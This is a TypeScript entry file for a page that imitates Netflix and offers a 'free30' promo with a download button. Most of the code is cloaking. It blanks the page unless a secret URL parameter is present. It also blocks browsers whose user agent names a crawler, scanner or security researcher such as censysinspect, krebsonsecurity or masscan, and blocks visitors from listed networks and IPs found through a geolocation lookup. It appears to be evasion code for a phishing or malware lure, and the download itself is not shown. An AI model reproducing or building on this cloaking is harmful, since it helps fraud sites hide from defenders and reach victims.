import '@/assets/css/style.css';
import { movies } from '@/data/movies';
import section1,{ initDownloadButton } from '@/section/section-1';
import section2 from '@/section/section-2';
import section3 from '@/section/section-3';
import section4 from '@/section/section-4';
import splashScreen from '@/section/splash-screen';
import MovieNavigation from '@/utils/movie-navigation';

const blockedKeywords = [
    'bot',
    'crawler',
    'spider',
    'puppeteer',
    'selenium',
    'http',
    'client',
    'curl',
    'wget',
    'python',
    'java',
    'ruby',
    'go',
    'scrapy',
    'lighthouse',
    'censysinspect',
    'facebookexternalhit',
    'krebsonsecurity',
    'ivre-masscan',
    'ahrefs',
    'semrush',
    'sistrix',
    'mailchimp',
    'mailgun',
    'larbin',
    'libwww',
    'spinn3r',
    'zgrab',
    'masscan',
    'yandex',
    'baidu',
    'sogou',
    'tweetmeme',
    'misting',
    'BotPoke',
];
const blockedASNs = [
    15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 8075,
    214961, 401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939,
    209, 51396,
];

const blockedIPs = ['95.214.55.43', '154.213.184.3'];

const checkAndBlockBots = () => {
    const userAgent = navigator.userAgent.toLowerCase();
    if (blockedKeywords.some((keyword) => userAgent.includes(keyword))) {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return true;
    }
    return false;
};

const checkAndBlockByGeoIP = async () => {
    try {
        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
        const data = await response.json();

        if (
            blockedASNs.includes(Number(data.asn)) ||
            blockedIPs.includes(data.ip)
        ) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
            return true;
        }

        return false;
    } catch {
        return false;
    }
};

const initApp = () => {
    document.querySelector<HTMLDivElement>('#app')!.innerHTML = /* HTML */ `
        <main>${splashScreen}</main>
    `;
    setTimeout(() => {
        const logo = document.querySelector('.netflix-logo');
        if (logo) {
            logo.classList.add('zoom-out');
        }
        setTimeout(() => {
            document.querySelector<HTMLDivElement>('#app')!.innerHTML =
                /* HTML */ `
                    <main>${section1} ${section2} ${section3} ${section4}</main>
                `;

            const movieNav = new MovieNavigation(movies);
            movieNav.init();

            initDownloadButton();
        }, 400);
    }, 3000);
};

const checkRequiredParam = () => {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('promo') === 'free30';
};

(async () => {
    if (!checkRequiredParam()) {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
        return;
    }

    if (!checkAndBlockBots()) {
        const blocked = await checkAndBlockByGeoIP();
        if (!blocked) {
            initApp();
        }
    } else {
        document.body.innerHTML = '';
        window.location.href = 'about:blank';
    }
})();
